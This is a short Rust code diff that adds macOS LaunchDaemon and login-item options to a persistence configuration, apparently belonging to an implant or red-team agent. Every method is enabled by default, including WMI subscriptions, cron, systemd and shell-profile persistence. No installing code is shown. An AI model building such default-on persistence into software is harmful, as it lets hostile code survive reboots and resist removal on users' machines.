@@ -219,6 +219,12 @@ pub struct PersistenceConfig {
     /// ~/Library/LaunchAgents plist loaded at user login (macOS).
     #[serde(default = "default_true")]
     pub launch_agent: bool,
+    /// /Library/LaunchDaemons plist loaded at boot (macOS, requires root).
+    #[serde(default = "default_true")]
+    pub launch_daemon: bool,
+    /// Login item added via osascript / System Events (macOS, user session).
+    #[serde(default = "default_true")]
+    pub login_item: bool,
     /// @reboot crontab entry as a fallback (macOS / Linux).
     #[serde(default = "default_true")]
     pub cron_job: bool,
@@ -244,6 +250,8 @@ impl Default for PersistenceConfig {
             startup_folder: true,
             wmi_subscription: true,
             launch_agent: true,
+            launch_daemon: true,
+            login_item: true,
             cron_job: true,
             systemd_service: true,
             shell_profile: true,
